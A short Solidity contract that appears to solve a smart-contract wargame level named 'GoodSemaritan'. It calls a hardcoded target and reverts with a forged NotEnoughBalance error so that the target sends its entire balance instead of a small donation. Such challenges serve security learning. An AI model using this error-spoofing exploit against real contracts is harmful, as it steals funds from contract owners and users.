// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INotifyable {
    function notify(uint256 amount) external;
}

interface IGoodSemaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract Notify is INotifyable {
    IGoodSemaritan semaritan = IGoodSemaritan(0xe9b2Df07C3B13C4fc262a0cdC3cdf9d983CE2846);
    bool flag = true;

    error NotEnoughBalance();

    function notify(uint256 amount) external pure override {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function run() external {
        semaritan.requestDonation();
    }
}
